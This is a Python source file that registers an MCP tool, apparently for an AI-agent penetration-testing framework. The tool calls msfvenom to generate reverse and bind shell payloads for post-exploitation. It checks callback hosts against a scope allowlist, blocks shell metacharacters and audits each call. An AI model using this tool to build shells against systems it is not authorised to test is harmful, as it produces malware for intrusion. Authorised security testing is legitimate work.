"""Payloads MCP tool registration."""

from __future__ import annotations

import subprocess

from tools.mcp_tools.registry import *


def register_payload_tools(mcp: Any, *, ctx: ToolContext) -> None:
    workspace = ctx.workspace
    config = ctx.config
    search = ctx.search
    nvd = ctx.nvd
    researcher = ctx.researcher
    audit_tool = ctx.audit_tool
    require_allowlist = ctx.require_allowlist

    @mcp.tool()
    @audit_tool
    def generate_payload(
        payload_type: str,
        lhost: str,
        lport: int = 4444,
        format: str = "exe",
        platform: str = "windows",
        arch: str = "x64",
        options: str = "",
    ) -> str:
        """Generate a payload using msfvenom. Supports reverse_tcp, reverse_https, bind_tcp and many output formats (exe, elf, raw, python, csharp, dll, ps1). Returns the path to the generated payload file in the workspace and a preview of the command used. Use for creating stagers, shells, or droppers during post-exploitation."""
        if not payload_type or not payload_type.strip():
            return "BLOCKED: payload_type is required."
        if not lhost or not lhost.strip():
            return "BLOCKED: lhost is required."
        if not validate_target_or_ip(lhost):
            return "ERROR: Invalid lhost (must be an IP or domain)."
        # Tool-layer scope gate: lhost is the payload's callback host. A payload
        # that calls back to an out-of-scope host is an egress path the allowlist
        # must gate (mirrors the command-analyzer egress check on the agent path).
        allowed, reason = check_targets_allowlist([lhost], config)
        if not allowed:
            return f"BLOCKED: {reason}\nTOOL: generate_payload\nLHOST: {lhost}"
        if not isinstance(lport, int) or lport < 1 or lport > 65535:
            return "ERROR: lport must be an integer between 1 and 65535."

        pt = payload_type.strip().lower()
        fmt = format.strip().lower()
        plat = platform.strip().lower()
        ar = arch.strip().lower()

        allowed_payloads = {"reverse_tcp", "reverse_https", "bind_tcp", "bind_tcp_rc4", "reverse_http"}
        if pt not in allowed_payloads:
            return f"BLOCKED: unsupported payload_type '{pt}'. Allowed: {', '.join(allowed_payloads)}"

        allowed_formats = {
            "exe",
            "elf",
            "raw",
            "python",
            "csharp",
            "dll",
            "ps1",
            "vba",
            "jsp",
            "war",
            "asp",
            "aspx",
            "macho",
        }
        if fmt not in allowed_formats:
            return f"BLOCKED: unsupported format '{fmt}'. Allowed: {', '.join(allowed_formats)}"

        allowed_platforms = {"windows", "linux", "android", "osx", "unix", "php", "java", "python"}
        if plat not in allowed_platforms:
            return f"BLOCKED: unsupported platform '{plat}'. Allowed: {', '.join(allowed_platforms)}"

        allowed_archs = {"x64", "x86", "armle", "aarch64", "mipsle", "mipsbe"}
        if ar not in allowed_archs:
            return f"BLOCKED: unsupported arch '{ar}'. Allowed: {', '.join(allowed_archs)}"

        attempt_dir, attempt_id = _attempt_dir(workspace)
        out_file = (
            attempt_dir
            / f"payload_{pt}_{plat}_{ar}.{fmt.replace('python', 'py').replace('csharp', 'cs').replace('powershell', 'ps1')}"
        )

        # H2: parse options with shlex and reject the whole call if options
        # contains any shell metacharacter (a value could otherwise inject into
        # the previous ``bash -c`` string). Build the msfvenom argv as a list so
        # every option is a literal argument (no shell).
        msf_argv = [
            "msfvenom",
            "-p",
            f"{plat}/{ar}/{pt}",
            f"LHOST={lhost}",
            f"LPORT={lport}",
            "-f",
            fmt,
        ]
        if options.strip():
            if re.search(r"[;|&$`()]|<|>|\n", options):
                return "BLOCKED: options contains forbidden shell metacharacters."
            import shlex as _shlex

            try:
                parsed_opts = _shlex.split(options)
            except ValueError:
                return "BLOCKED: options string could not be parsed (unbalanced quotes)."
            msf_argv.extend(parsed_opts)
        msf_argv.extend(["-o", str(out_file)])
        cmd = " ".join(msf_argv)  # reported in the result for operator visibility

        log_path = attempt_dir / "msfvenom.log"
        start = time.monotonic()
        try:
            returncode, out, err = _run_with_pgrp_timeout(
                msf_argv,
                300,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
            )
            output = (out + "\n" + err)[-3000:]
            status = "completed" if returncode == 0 else "failed"
        except subprocess.TimeoutExpired:
            status = "timed_out"
            output = "msfvenom timed out after 300s"
            returncode = None
        except Exception as exc:  # ponytail: bare except intentional
            status = "error"
            output = str(exc)
            returncode = None

        elapsed = time.monotonic() - start
        file_size = out_file.stat().st_size if out_file.exists() else 0

        return (
            f"PAYLOAD_RESULT: {status}\n"
            f"ATTEMPT_ID: {attempt_id}\n"
            f"COMMAND: {cmd}\n"
            f"FILE: {out_file}\n"
            f"FILE_SIZE: {file_size} bytes\n"
            f"DURATION: {elapsed:.1f}s\n"
            f"OUTPUT:\n{output}"
        )
